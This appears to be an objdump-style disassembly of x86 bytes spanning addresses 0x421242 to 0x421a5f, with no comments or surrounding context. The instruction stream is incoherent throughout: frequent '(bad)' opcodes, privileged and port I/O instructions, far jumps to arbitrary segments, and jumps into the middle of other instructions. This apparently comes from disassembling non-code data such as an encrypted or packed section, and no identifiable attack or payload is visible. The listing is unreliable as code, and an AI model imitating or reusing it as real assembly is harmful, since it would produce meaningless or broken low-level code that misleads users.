  421242:	mov    ebp,0x991868a6
  421247:	retf   0x706
  42124a:	in     al,0x30
  42124c:	jmp    0x421210
  42124e:	call   0xeb3a:0x47551f3c
  421255:	(bad)  
  421256:	cmp    BYTE PTR [esi+0x38],cl
  421259:	jecxz  0x42125e
  42125b:	dec    edi
  42125c:	push   ds
  42125d:	fbld   TBYTE PTR [ebp+ebp*1-0x3]
  421261:	push   0xe655efa
  421266:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421267:	jo     0x421254
  421269:	jb     0x421236
  42126b:	dec    ecx
  42126c:	cdq    
  42126d:	lods   eax,DWORD PTR ds:[esi]
  42126e:	mov    ecx,0x1c95f716
  421273:	pusha  
  421274:	lahf   
  421275:	fimul  WORD PTR [ebx+0x26e52695]
  42127b:	mov    cl,0x1b
  42127d:	ds push 0xffffffcb
  421280:	aad    0x72
  421282:	xor    al,0x11
  421284:	sti    
  421285:	xchg   ecx,eax
  421286:	pop    ebp
  421287:	in     eax,0x77
  421289:	test   ch,bh
  42128b:	nop
  42128c:	add    al,0xe1
  42128e:	sub    al,0x6e
  421290:	retf   0xab0f
  421293:	enter  0x7dc3,0xd9
  421297:	(bad)
  42129b:	icebp  
  42129c:	jmp    0x4212f1
  42129e:	mov    cl,0x8a
  4212a0:	shl    BYTE PTR [esp+esi*4+0x6c],1
  4212a4:	sub    al,ah
  4212a6:	shl    BYTE PTR [edx+ebp*2+0xb],0x6d
  4212ab:	stos   DWORD PTR es:[edi],eax
  4212ac:	sbb    DWORD PTR [ebx+0x4b0c1f54],ebx
  4212b2:	in     eax,0x36
  4212b4:	outs   dx,BYTE PTR ds:[esi]
  4212b5:	(bad)  
  4212b7:	add    BYTE PTR [esi-0xcba0183],dh
  4212bd:	fsubp  st(7),st
  4212bf:	ins    DWORD PTR es:[edi],dx
  4212c0:	ret    0xf344
  4212c3:	jg     0x421274
  4212c5:	pop    ds
  4212c6:	(bad)  [ecx-0x69d04b15]
  4212cc:	dec    edx
  4212cd:	test   DWORD PTR [esi-0x3d],ebx
  4212d0:	inc    esp
  4212d1:	(bad)  
  4212d3:	test   al,0x32
  4212d5:	mov    esp,0xae2e4460
  4212da:	clc    
  4212db:	dec    edx
  4212dc:	adc    eax,0x5367b9bb
  4212e1:	ds add eax,0x15b9b451
  4212e7:	xor    ch,bl
  4212e9:	sub    DWORD PTR [edi],ebp
  4212eb:	icebp  
  4212ec:	mov    cl,0x15
  4212ee:	pop    ss
  4212ef:	sub    DWORD PTR [edi-0x21],esp
  4212f2:	mov    ecx,0x6e849bad
  4212f8:	and    eax,0x559adaa3
  4212fd:	sahf   
  4212fe:	cld    
  4212ff:	mov    ecx,0x3f6d9469
  421304:	pop    ss
  421305:	fcom   DWORD PTR [ecx+ebx*4-0x3]
  421309:	sbb    ebp,0xff4868e1
  42130f:	inc    ecx
  421310:	jmp    0x421308
  421312:	dec    ebx
  421313:	stos   DWORD PTR es:[edi],eax
  421314:	or     al,0x8c
  421316:	into   
  421317:	sub    BYTE PTR [edi-0x2a3cab21],0xd2
  42131e:	pushf  
  42131f:	xchg   DWORD PTR [bx+di-0x3303],esi
  421324:	xchg   ecx,eax
  421325:	add    edx,eax
  421327:	mov    esi,0x969d5549
  42132c:	ret    
  42132d:	(bad)  
  42132f:	mov    bl,0xcc
  421331:	sub    DWORD PTR [ebp-0x54ab94c6],ebp
  421337:	jmp    0x285:0xb772e9eb
  42133e:	hlt    
  42133f:	gs xor eax,0x8b4f9edf
  421345:	mov    eax,ds:0xaa5b70ce
  42134a:	cld    
  42134b:	fild   WORD PTR [ebx+0x561c1f9a]
  421351:	sahf   
  421352:	dec    ecx
  421353:	push   ds
  421354:	mov    edx,0xdf2876a5
  421359:	sub    al,0x2d
  42135b:	push   0x50d7c4eb
  421360:	adc    ecx,DWORD PTR [edx+0x6f]
  421363:	frstor [ecx+0x7ddf3fdc]
  421369:	in     al,dx
  42136a:	lods   al,BYTE PTR ds:[esi]
  42136b:	aad    0x1b
  42136d:	fcmovnu st,st(7)
  42136f:	sbb    dh,ah
  421371:	jge    0x421392
  421373:	mov    bh,0x8c
  421375:	jp     0x421354
  421377:	imul   ebx,DWORD PTR [ecx-0x1e],0xffffffc4
  42137b:	mov    esp,0xc85fe1a8
  421380:	mov    eax,0x3e54b53a
  421385:	push   esi
  421386:	call   FWORD PTR ds:0x179f79c
  42138c:	jmp    0x47655039
  421391:	mov    esp,0x62130ce0
  421396:	jl     0x421387
  421398:	pop    es
  421399:	(bad)  
  42139a:	jge    0x4213b2
  42139c:	shr    dh,1
  42139e:	sbb    esi,0xbefd86aa
  4213a4:	push   esi
  4213a5:	inc    ebp
  4213a6:	dec    ecx
  4213a7:	iret   
  4213a8:	outs   dx,DWORD PTR ds:[esi]
  4213a9:	add    eax,0xa719dbfd
  4213ae:	hlt    
  4213af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4213b0:	dec    esi
  4213b1:	ret    
  4213b2:	icebp  
  4213b3:	loopne 0x4213fe
  4213b5:	xor    al,0xfd
  4213b7:	mov    edi,0x25a2b5ca
  4213bc:	and    esp,ebp
  4213be:	or     BYTE PTR [ebx-0x6e],bh
  4213c1:	retf   0xc78e
  4213c4:	add    dh,BYTE PTR [eax-0x34]
  4213c7:	test   al,0xea
  4213c9:	es dec eax
  4213cb:	clc    
  4213cc:	mov    cl,0x5e
  4213ce:	inc    ebx
  4213cf:	enter  0x88dd,0x78
  4213d3:	sub    ecx,DWORD PTR [esi-0x15558f76]
  4213d9:	jo     0x4213f8
  4213db:	stc    
  4213dc:	sbb    ch,al
  4213de:	nop
  4213df:	push   0xc82527b0
  4213e4:	int    0x4c
  4213e6:	ins    DWORD PTR es:[edi],dx
  4213e7:	lock out dx,al
  4213e9:	cmp    al,0x26
  4213eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4213ec:	out    0x41,al
  4213ee:	cmp    al,0x85
  4213f0:	add    al,0x79
  4213f2:	ins    DWORD PTR es:[edi],dx
  4213f3:	pop    ss
  4213f4:	jbe    0x42137c
  4213f6:	cmc    
  4213f7:	mov    WORD PTR [ebx-0x55],ss
  4213fa:	(bad)  
  4213fb:	arpl   WORD PTR [eax+0x23],si
  4213fe:	mov    eax,0x49b22b97
  421403:	and    al,0xeb
  421405:	jno    0x42147e
  421407:	cli    
  421408:	jp     0x42147d
  42140a:	aaa    
  42140b:	jg     0x42143a
  42140d:	xchg   edx,esi
  42140f:	mov    ch,0xc2
  421411:	cwde   
  421412:	out    0xc7,al
  421414:	dec    ebp
  421415:	pop    ecx
  421416:	adc    BYTE PTR [ecx+0x72414847],al
  42141c:	mov    ebp,0x8593dddf
  421421:	mov    ds:0xdfbd5e6d,al
  421426:	inc    ebx
  421427:	mov    bl,0x83
  421429:	dec    edi
  42142a:	je     0x421477
  42142c:	es push 0x5fe195e8
  421432:	fisubr DWORD PTR [esi+esi*4]
  421435:	xchg   ebp,eax
  421436:	clc    
  421437:	inc    esi
  421438:	ins    BYTE PTR es:[edi],dx
  421439:	jmp    0xc981:0x2b52c602
  421440:	rol    esi,0x64
  421443:	test   al,0x92
  421445:	cmp    ebx,DWORD PTR [edx+0x6a]
  421448:	in     eax,dx
  421449:	cwde   
  42144a:	sub    cl,BYTE PTR [ebx-0x4b]
  42144d:	fild   WORD PTR [ebp+0x718d0386]
  421453:	mov    al,ds:0x5140e019
  421458:	bound  ebx,QWORD PTR [edi-0x58]
  42145b:	sbb    ah,ah
  42145d:	adc    ah,BYTE PTR [esi+0x47fbeeab]
  421463:	push   ebx
  421464:	rcr    DWORD PTR [edi-0x77],0x7f
  421468:	cmp    eax,0x26c876c6
  42146d:	aaa    
  42146e:	call   FWORD PTR [ebx-0x22]
  421471:	daa    
  421472:	push   edx
  421473:	mov    esi,0xcb986ae6
  421478:	dec    edi
  421479:	sub    ecx,DWORD PTR [ebp+0x24060c9]
  42147f:	enter  0x3c26,0x8f
  421483:	cmp    DWORD PTR [ecx-0x55],ebx
  421486:	in     eax,dx
  421487:	in     al,dx
  421488:	popf   
  421489:	add    al,0x23
  42148b:	mov    bl,0xeb
  42148d:	sub    ebp,ebx
  42148f:	push   cs
  421490:	push   cs
  421491:	jbe    0x42146a
  421493:	sub    DWORD PTR [ebp-0x31],edi
  421496:	xchg   edi,eax
  421497:	enter  0x98d6,0x11
  42149b:	leave  
  42149c:	ins    BYTE PTR es:[edi],dx
  42149d:	adc    al,0x8c
  42149f:	push   ss
  4214a0:	in     al,dx
  4214a1:	addr16 dec edx
  4214a3:	mov    ecx,0x364962a1
  4214a8:	inc    ebx
  4214a9:	or     cl,bl
  4214ab:	loop   0x4214e9
  4214ad:	mov    ebp,0xf74adfc
  4214b2:	push   ebp
  4214b3:	mov    esi,0x4efd08e9
  4214b8:	mov    WORD PTR [edx],?
  4214ba:	int    0x56
  4214bc:	dec    esp
  4214bd:	jg     0x421487
  4214bf:	leave  
  4214c0:	sub    DWORD PTR ds:0x9dd13e05,esi
  4214c6:	adc    BYTE PTR [esp+ecx*8],bl
  4214c9:	pop    edi
  4214ca:	add    BYTE PTR [esi],al
  4214cc:	or     eax,0x289e2c7a
  4214d1:	pop    ds
  4214d2:	mov    eax,0xd0df149b
  4214d7:	or     eax,0xa8112005
  4214dc:	cmp    al,BYTE PTR [eiz*2-0x6372192b]
  4214e3:	call   0xc71f8ead
  4214e8:	mov    cl,0x66
  4214ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4214eb:	enter  0x5239,0x81
  4214ef:	mov    ebx,0x40544a4f
  4214f4:	jmp    0x42149a
  4214f6:	fsub   DWORD PTR [esi-0x59]
  4214f9:	sbb    edi,edx
  4214fb:	pop    ss
  4214fc:	popf   
  4214fd:	fild   QWORD PTR [ecx-0x2e]
  421500:	js     0x4214f4
  421502:	clc    
  421503:	mov    edi,DWORD PTR [ebx]
  421505:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421506:	cld    
  421507:	fst    QWORD PTR [edx+0x5a3cb71]
  42150d:	jl     0x4214cd
  42150f:	enter  0x872d,0xa0
  421513:	shr    ch,cl
  421515:	sub    eax,0x23eba07f
  42151a:	imul   edx,DWORD PTR [eax],0x6e054cdd
  421520:	mov    edi,0x3b39c8df
  421525:	and    BYTE PTR [eax],cl
  421527:	sbb    eax,0xd8fd746e
  42152c:	retf   
  42152d:	bound  esp,QWORD PTR [esi-0x39]
  421530:	sbb    BYTE PTR [esi+0x1391c8af],cl
  421536:	retf   
  421537:	aas    
  421538:	jge    0x421504
  42153a:	loope  0x4214bc
  42153c:	jmp    0x421579
  42153e:	and    eax,0xaca799e1
  421543:	je     0x42154f
  421545:	loopne 0x42154e
  421547:	mov    esi,0x587d0b18
  42154c:	cli    
  42154d:	adc    BYTE PTR [eax+0x7e18e199],bh
  421553:	dec    eax
  421554:	jb     0x421504
  421556:	and    DWORD PTR [edi-0x5f6c007d],edi
  42155c:	inc    edi
  42155d:	(bad)  
  42155f:	add    ebx,DWORD PTR [esi-0x6f6498dc]
  421565:	push   ss
  421566:	add    BYTE PTR [esp+edi*1],dh
  421569:	mov    ah,0x27
  42156b:	xchg   ebp,eax
  42156c:	mov    dh,0x5f
  42156e:	das    
  42156f:	push   edx
  421570:	sbb    eax,0x6bd12207
  421575:	(bad)
  421578:	xor    al,0xd7
  42157a:	cli    
  42157b:	mov    bl,0xeb
  42157d:	or     eax,0xff243e8d
  421582:	cmp    DWORD PTR [ecx-0x209520b3],eax
  421588:	push   cs
  421589:	(bad)  
  42158a:	cmp    eax,0x8d2d6947
  42158f:	cmp    eax,0x388652eb
  421594:	jl     0x421566
  421596:	add    dl,BYTE PTR [ebx+esi*8]
  421599:	jmp    0x4215db
  42159b:	sbb    BYTE PTR [esi],bl
  42159d:	pop    edi
  42159e:	(bad)  
  42159f:	call   0x65fa8794
  4215a4:	out    0xea,al
  4215a6:	inc    esp
  4215a7:	jb     0x421552
  4215a9:	or     cl,BYTE PTR [ebp-0x40]
  4215ac:	cld    
  4215ad:	inc    edi
  4215ae:	pop    ecx
  4215af:	enter  0x9b44,0x8f
  4215b3:	in     eax,0x53
  4215b5:	push   0xffffff8f
  4215b7:	ja     0x42155b
  4215b9:	test   ebp,edi
  4215bb:	in     al,dx
  4215bc:	push   esp
  4215bd:	cs jl  0x421544
  4215c0:	cmp    eax,0xd1c7d7f1
  4215c5:	pop    ds
  4215c6:	mov    BYTE PTR es:[eax],0x19
  4215ca:	xchg   edi,ecx
  4215cc:	jmp    0xe683:0xcad566c1
  4215d3:	and    bh,ah
  4215d5:	mov    bh,ch
  4215d7:	or     DWORD PTR [eax],ecx
  4215d9:	dec    eax
  4215da:	or     BYTE PTR [eax-0xac4fbe0],al
  4215e0:	imul   ecx,DWORD PTR [edx],0xffffffc5
  4215e3:	push   edi
  4215e4:	add    BYTE PTR [ebx],bh
  4215e6:	mov    dh,cl
  4215e8:	jmp    0x421643
  4215ea:	pop    edi
  4215eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4215ec:	jge    0x4215ce
  4215ee:	jge    0x4215dc
  4215f0:	push   eax
  4215f1:	fbld   TBYTE PTR [esp+eax*4-0x16e319f4]
  4215f8:	mov    ah,0x44
  4215fa:	gs or  eax,0xc8eb9bde
  421600:	mov    ebp,ds
  421602:	lods   al,BYTE PTR ds:[esi]
  421603:	addr16 inc ebp
  421605:	pop    esi
  421606:	in     eax,dx
  421607:	int3   
  421608:	add    dh,0x9f
  42160b:	push   0xcaf0fe7a
  421610:	cmp    BYTE PTR [esi],al
  421612:	data16 test bl,bh
  421615:	pop    es
  421616:	jge    0x4215e6
  421618:	push   0x2d13fa85
  42161d:	jecxz  0x42168a
  42161f:	pop    eax
  421620:	sub    eax,DWORD PTR [edi]
  421622:	push   es
  421623:	cmp    bh,BYTE PTR [edx]
  421625:	fisttp WORD PTR [ebp+0x60]
  421628:	add    ch,al
  42162a:	add    BYTE PTR [esi+0x72f29884],bh
  421630:	mov    al,0xfa
  421632:	adc    DWORD PTR [eax+0x2],ebp
  421635:	pop    ecx
  421636:	mov    al,ds:0x96df146b
  42163b:	fwait
  42163c:	xor    DWORD PTR [edx-0x67],edx
  42163f:	cmp    eax,0x7cfce8dc
  421644:	adc    bh,BYTE PTR [ebx+0x7f]
  421647:	sub    BYTE PTR [edx+ebx*2-0x570e9a8],0x82
  42164f:	adc    BYTE PTR [edi],dl
  421651:	nop
  421652:	in     eax,0xe5
  421654:	ret    0x3c
  421657:	stos   DWORD PTR es:[edi],eax
  421658:	gs repz dec esp
  42165b:	pop    eax
  42165c:	xor    bh,BYTE PTR [ebx]
  42165e:	dec    esi
  42165f:	out    dx,al
  421660:	(bad)  
  421661:	xchg   ecx,eax
  421662:	enter  0x88bf,0x58
  421666:	bound  ecx,QWORD PTR [edi-0x15]
  421669:	fidivr DWORD PTR [esi]
  42166b:	mov    DWORD PTR [esi],eax
  42166d:	ds std 
  42166f:	mov    eax,ds:0x7acca54a
  421674:	fisubr DWORD PTR [esp+eax*1-0x38]
  421678:	sbb    DWORD PTR [esp+esi*2-0x3a1f084a],eax
  42167f:	mov    ecx,0x5d001b23
  421684:	aas    
  421685:	inc    edi
  421686:	xor    dh,0xa
  421689:	xchg   BYTE PTR [ecx],dl
  42168b:	xchg   esp,eax
  42168c:	cmp    bl,BYTE PTR [edi-0x6a]
  42168f:	push   esp
  421690:	nop
  421691:	loopne 0x42161c
  421693:	or     DWORD PTR [edi-0x7507b656],ebx
  421699:	pop    ebp
  42169a:	push   esi
  42169b:	jle    0x421688
  42169d:	jp     0x4216c7
  42169f:	sbb    BYTE PTR [edi-0x24d89203],ch
  4216a5:	fisttp WORD PTR [ecx]
  4216a7:	mov    BYTE PTR [edx-0x4d],al
  4216aa:	mov    ebx,0xfa5aefc7
  4216af:	and    DWORD PTR ds:0x6bdd9932,edi
  4216b5:	xchg   esp,eax
  4216b6:	and    eax,0x69df9e91
  4216bb:	arpl   WORD PTR ds:0x5f85a0a9,cx
  4216c1:	(bad)  
  4216c3:	sub    BYTE PTR [edx+0x7c53ffcf],cl
  4216c9:	hlt    
  4216ca:	in     al,dx
  4216cb:	(bad)  
  4216cc:	adc    BYTE PTR [edx-0x531c0275],ch
  4216d2:	sbb    al,BYTE PTR [edx-0x16]
  4216d5:	icebp  
  4216d6:	loope  0x421735
  4216d8:	shr    dl,1
  4216da:	ss pusha 
  4216dc:	mov    ecx,0xc3c77dce
  4216e1:	mov    bl,0xff
  4216e3:	lahf   
  4216e4:	pop    ss
  4216e5:	out    dx,eax
  4216e6:	aam    0xe8
  4216e8:	int    0x45
  4216ea:	std    
  4216eb:	jb     0x4216bc
  4216ed:	test   al,0x52
  4216ef:	add    eax,0xd0e48904
  4216f4:	pushf  
  4216f5:	repz inc edx
  4216f7:	jp     0x4216e4
  4216f9:	pop    ebx
  4216fa:	fldenv [ecx+0x55]
  4216fd:	icebp  
  4216fe:	cld    
  4216ff:	mov    edx,0x1e992fbc
  421704:	pop    ss
  421705:	out    dx,al
  421706:	in     al,0xca
  421708:	(bad)  
  421709:	push   0xffffffc8
  42170b:	outs   dx,DWORD PTR ds:[esi]
  42170c:	leave  
  42170d:	add    ch,0x98
  421710:	sub    esi,DWORD PTR [edx]
  421712:	cld    
  421713:	aad    0xde
  421715:	push   ecx
  421716:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421717:	push   eax
  421718:	cld    
  421719:	pop    esi
  42171a:	pusha  
  42171b:	loop   0x4216b8
  42171d:	daa    
  42171e:	sbb    al,0xcb
  421720:	outs   dx,DWORD PTR ds:[esi]
  421721:	dec    DWORD PTR [eax+0x63cbf327]
  421727:	or     BYTE PTR [edi+0x50],cl
  42172a:	icebp  
  42172b:	gs jmp 0x421736
  42172e:	ins    DWORD PTR es:[edi],dx
  42172f:	adc    eax,0x5c6924ca
  421734:	and    bl,cl
  421736:	add    DWORD PTR [edx-0x3f1320da],esp
  42173c:	push   esp
  42173d:	jl     0x4216cc
  42173f:	mov    eax,0xd7a4b9f5
  421744:	in     al,0x68
  421746:	pop    ebx
  421747:	dec    eax
  421748:	sahf   
  421749:	or     eax,0x26670fd6
  42174e:	cs enter 0xf4ee,0xa4
  421753:	sub    BYTE PTR [esi+edx*8+0x6a],bl
  421757:	hlt    
  421758:	jmp    0x421777
  42175a:	ss pop ebx
  42175c:	jno    0x421756
  42175e:	cmp    BYTE PTR [esi],0x77
  421761:	jecxz  0x42179b
  421763:	imul   DWORD PTR [eax-0x3]
  421766:	fld    QWORD PTR [edi-0xf]
  421769:	push   ds
  42176a:	dec    edx
  42176b:	daa    
  42176c:	in     al,dx
  42176d:	mov    cl,0x96
  42176f:	lds    edi,FWORD PTR [ecx+0x1f062694]
  421775:	cld    
  421776:	xchg   esp,eax
  421777:	enter  0xa1c9,0x8b
  42177b:	popf   
  42177c:	ror    ebx,0x99
  42177f:	adc    eax,0x7bec8de5
  421784:	dec    ebx
  421785:	pop    esp
  421786:	dec    edi
  421787:	retf   
  421788:	popa   
  421789:	cdq    
  42178a:	lock add al,0x73
  42178d:	inc    ecx
  42178e:	pop    ebp
  42178f:	(bad)  [esi+0x430afe4a]
  421795:	or     al,bh
  421797:	adc    BYTE PTR ds:[edi-0x1fff37e4],ch
  42179e:	div    DWORD PTR [esi+esi*4+0x3a7f7dc1]
  4217a5:	pop    ebx
  4217a6:	add    dl,cl
  4217a8:	jl     0x421777
  4217aa:	or     BYTE PTR [edx-0x698a9995],0xa8
  4217b1:	push   es
  4217b2:	pop    eax
  4217b3:	xchg   ebp,eax
  4217b4:	dec    esi
  4217b5:	fbld   TBYTE PTR [ebp-0x15]
  4217b8:	adc    DWORD PTR [ebp-0x3aeda77c],edx
  4217be:	cld    
  4217bf:	push   esi
  4217c0:	pop    ss
  4217c1:	inc    edi
  4217c2:	jb     0x42178e
  4217c4:	inc    esi
  4217c5:	enter  0xc8a6,0x74
  4217c9:	ins    DWORD PTR es:[edi],dx
  4217ca:	sub    ebp,DWORD PTR es:[edi+0x27]
  4217ce:	sub    edx,edi
  4217d0:	jmp    0x4217dc
  4217d2:	push   ss
  4217d3:	repz int 0x57
  4217d6:	pop    ebx
  4217d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4217d8:	and    bl,bh
  4217da:	inc    eax
  4217db:	fs mov dh,0x2d
  4217de:	mov    ebx,0x68f071
  4217e3:	adc    eax,ebp
  4217e5:	sar    BYTE PTR [edi+0x14],1
  4217e8:	adc    ch,BYTE PTR [edi+0x3]
  4217eb:	mov    eax,0xbb1cdec8
  4217f0:	in     al,0x3
  4217f2:	dec    esp
  4217f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4217f4:	pop    edx
  4217f5:	das    
  4217f6:	mov    eax,ds:0x919eeb0d
  4217fb:	xchg   edi,eax
  4217fc:	inc    ebp
  4217fd:	dec    esp
  4217fe:	fcmovnb st,st(4)
  421800:	push   edi
  421801:	fist   WORD PTR [edi-0x1c49deb8]
  421807:	mov    ebx,0x8ffcd69f
  42180c:	(bad)  
  42180e:	mov    edi,0x4a064fa3
  421813:	enter  0x9e2,0x94
  421817:	std    
  421818:	adc    BYTE PTR [ebp+0x76],dl
  42181b:	jns    0x4217fb
  42181d:	shl    DWORD PTR [edi],1
  42181f:	enter  0x1494,0xab
  421823:	aam    0xe7
  421825:	lods   eax,DWORD PTR ds:[esi]
  421826:	inc    ebp
  421827:	enter  0x3dc1,0x25
  42182b:	cmp    ch,BYTE PTR [ecx-0x14304e73]
  421831:	dec    ecx
  421832:	xchg   ecx,eax
  421833:	jle    0x4217ce
  421835:	retf   0xac6a
  421838:	and    al,0xdf
  42183a:	cmp    DWORD PTR [eax+0x72],0x36b5eff0
  421841:	cmp    al,0xe5
  421843:	xor    BYTE PTR [eax+0x5f],ah
  421846:	test   al,0x9
  421848:	pop    ss
  421849:	and    eax,0xdfc74e33
  42184e:	shl    BYTE PTR [ebp+0x23],0x6d
  421852:	cmp    eax,0x2fdafc58
  421857:	(bad)  
  421858:	jmp    0x421849
  42185a:	pop    edx
  42185b:	mov    dh,0x24
  42185d:	adc    ecx,esp
  42185f:	sbb    edi,DWORD PTR [eax]
  421861:	fisttp WORD PTR [ecx]
  421863:	(bad)  
  421864:	mov    dl,BYTE PTR [ebx+0x78d497e3]
  42186a:	(bad)  
  42186b:	pusha  
  42186c:	mov    ebx,0x20a00ec4
  421871:	aas    
  421872:	xchg   ebp,eax
  421873:	xor    al,bh
  421875:	fild   WORD PTR [esi+0x70]
  421878:	cmp    al,0xaa
  42187a:	inc    edx
  42187b:	jmp    FWORD PTR [edx+0x3e]
  42187e:	std    
  42187f:	scas   eax,DWORD PTR es:[edi]
  421880:	push   esp
  421881:	loopne 0x421836
  421883:	xchg   edx,eax
  421884:	pop    esi
  421885:	add    DWORD PTR [ebx-0x63],esi
  421888:	arpl   di,bx
  42188a:	out    0xe6,al
  42188c:	pop    ecx
  42188d:	in     al,dx
  42188e:	sub    esp,ebx
  421890:	fimul  DWORD PTR [edx]
  421892:	std    
  421893:	mov    ebp,0x8ddf7775
  421898:	lods   al,BYTE PTR ds:[esi]
  421899:	adc    al,0xd9
  42189b:	int    0x6a
  42189d:	inc    eax
  42189e:	fs jns 0x4218ec
  4218a1:	mov    ebp,0x5f954c3f
  4218a6:	std    
  4218a7:	mov    eax,0x7e5bd634
  4218ac:	and    al,0xa0
  4218ae:	inc    esi
  4218af:	enter  0x6286,0x3b
  4218b3:	pop    esp
  4218b4:	jg     0x42191b
  4218b6:	repnz mov al,ds:0xd34e41ee
  4218bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4218bd:	jg     0x42185d
  4218bf:	xchg   edi,eax
  4218c0:	dec    eax
  4218c1:	lods   al,BYTE PTR ds:[esi]
  4218c2:	sti    
  4218c3:	into   
  4218c4:	push   ebp
  4218c5:	jbe    0x4218ce
  4218c7:	xor    al,0x3f
  4218c9:	pop    ds
  4218ca:	sti    
  4218cb:	aad    0x21
  4218cd:	xchg   BYTE PTR [ebp-0x5e],dl
  4218d0:	in     eax,dx
  4218d1:	sbb    edx,ebx
  4218d3:	hlt    
  4218d4:	lods   al,BYTE PTR ds:[esi]
  4218d5:	pop    esi
  4218d6:	(bad)  
  4218d8:	cmc    
  4218d9:	and    ch,ch
  4218db:	fmul   st,st(1)
  4218dd:	xchg   edi,eax
  4218de:	test   ebp,0x86d347eb
  4218e4:	hlt    
  4218e5:	sub    al,0xfc
  4218e7:	sahf   
  4218e8:	in     al,dx
  4218e9:	mov    cl,0xd
  4218eb:	scas   al,BYTE PTR es:[di]
  4218ed:	dec    ecx
  4218ee:	retf   0x23eb
  4218f1:	es and ebp,esp
  4218f4:	ret    0x53a
  4218f7:	enter  0xc089,0xd3
  4218fb:	loopne 0x4218d4
  4218fd:	xor    eax,0xd9cf86fd
  421902:	outs   dx,BYTE PTR ds:[esi]
  421903:	repnz ror cl,0xa7
  421907:	(bad)  
  421908:	js     0x4218b5
  42190a:	mov    bh,0xbc
  42190c:	stos   DWORD PTR es:[edi],eax
  42190d:	dec    esi
  42190e:	jns    0x42193e
  421910:	sahf   
  421911:	sbb    esi,DWORD PTR [ecx]
  421913:	add    al,0xec
  421915:	mov    ah,0x43
  421917:	xor    al,BYTE PTR [esi-0x70]
  42191a:	add    esi,DWORD PTR [eax-0x3775f765]
  421920:	cs clc 
  421922:	aaa    
  421923:	adc    eax,0x5bcbed31
  421928:	loopne 0x421978
  42192a:	mov    esi,0xda547ac8
  42192f:	jno    0x42192d
  421931:	or     al,0x35
  421933:	enter  0x7d19,0x53
  421937:	jmp    0x4218ff
  421939:	nop
  42193a:	aad    0xf3
  42193c:	jmp    0x42199f
  42193e:	(bad)  
  42193f:	cmp    al,0x5d
  421941:	pop    ss
  421942:	sub    al,0xfd
  421944:	lahf   
  421945:	fsubp  st(2),st
  421947:	sar    BYTE PTR [edx],cl
  421949:	xlat   BYTE PTR ds:[ebx]
  42194a:	test   eax,0x7f371d91
  42194f:	or     eax,0xbb8de2eb
  421954:	fs and al,0x9b
  421957:	sahf   
  421958:	dec    ebp
  421959:	fistp  WORD PTR [edx+0x77]
  42195c:	and    esp,DWORD PTR [esi+eax*4-0x3086cea]
  421963:	push   ds
  421964:	retf   0x1c3
  421967:	dec    eax
  421968:	sbb    bl,BYTE PTR [esi-0x10]
  42196b:	(bad)  
  42196c:	scas   al,BYTE PTR es:[edi]
  42196d:	(bad)  
  42196e:	out    0xb4,al
  421970:	mov    eax,ds:0xeb3d637f
  421975:	lahf   
  421976:	mov    eax,DWORD PTR [ecx]
  421978:	(bad)  
  421979:	pop    ecx
  42197a:	and    ah,ah
  42197c:	in     al,dx
  42197d:	ds xchg ebp,eax
  42197f:	push   edx
  421980:	inc    ebp
  421981:	(bad)  
  421983:	test   al,0xa5
  421985:	packssdw mm1,QWORD PTR [edx]
  421988:	mov    ds:0x74ed0210,eax
  42198d:	adc    bh,BYTE PTR ds:0xa99798a4
  421993:	pop    esp
  421994:	rcr    bh,cl
  421996:	adc    cl,dl
  421998:	sbb    al,0x61
  42199a:	sbb    dh,BYTE PTR [ebp+0x5e2d4dcc]
  4219a0:	int    0x60
  4219a2:	mov    ah,0xd9
  4219a4:	in     al,dx
  4219a5:	call   FWORD PTR [edi-0x5f23447e]
  4219ab:	int    0xb7
  4219ad:	fisub  WORD PTR ds:0xe46594ce
  4219b3:	mov    ds:0xced4ff29,al
  4219b8:	jmp    0x421943
  4219ba:	sbb    edi,DWORD PTR [edi-0xf43a545]
  4219c0:	mov    ch,0xc6
  4219c2:	cwde   
  4219c3:	enter  0x160,0x6b
  4219c7:	sti    
  4219c8:	adc    esp,DWORD PTR [edi]
  4219ca:	jns    0x421955
  4219cc:	jmp    0x42196d
  4219ce:	imul   ebx,DWORD PTR [edx+esi*2-0x4e9f55d7],0x413b0cdf
  4219d9:	repz push edx
  4219db:	imul   ecx,DWORD PTR ds:0x5949fce5,0x9a391201
  4219e5:	test   BYTE PTR [esi],bl
  4219e7:	enter  0x347f,0xfb
  4219eb:	hlt    
  4219ec:	sbb    eax,0x9bd19705
  4219f1:	fdiv   st(4),st
  4219f3:	jmp    0x7f48:0x6abc4774
  4219fa:	je     0x4219c4
  4219fc:	mov    bh,0x2c
  4219fe:	enter  0xf9f0,0x3d
  421a02:	sbb    BYTE PTR [ebp+0x1d],al
  421a05:	inc    ecx
  421a06:	std    
  421a07:	xor    BYTE PTR [eax],dl
  421a09:	pop    ebx
  421a0a:	leave  
  421a0b:	push   es
  421a0c:	xchg   ecx,eax
  421a0d:	adc    al,0xcf
  421a0f:	jl     0x421994
  421a11:	(bad)  
  421a12:	cld    
  421a13:	jae    0x4219ec
  421a15:	push   es
  421a16:	lea    edi,[edx-0x1c02be4f]
  421a1c:	cli    
  421a1d:	stos   BYTE PTR es:[edi],al
  421a1e:	fs adc esp,0xa
  421a22:	nop
  421a23:	enter  0x65f4,0xb0
  421a27:	lahf   
  421a28:	in     al,0x21
  421a2a:	sub    DWORD PTR [edx-0x2d7d9815],edi
  421a30:	inc    ecx
  421a31:	mov    ds:0xdfb059c1,al
  421a36:	jp     0x421a7c
  421a38:	jl     0x421a83
  421a3a:	mov    edi,0xfddccff9
  421a3f:	mov    edx,0x18aa9ff6
  421a44:	fidivr DWORD PTR [edx]
  421a46:	cmp    eax,0x6b424210
  421a4b:	enter  0xeb1c,0x88
  421a4f:	sub    DWORD PTR [ebp-0x10],eax
  421a52:	pop    eax
  421a53:	sbb    eax,0x47973811
  421a58:	jmp    0x421a4e
  421a5a:	ss jecxz 0x421a20
  421a5d:	(bad)  
  421a5e:	lahf   
  421a5f:	jmp    0x7965:0x8fdcdff0
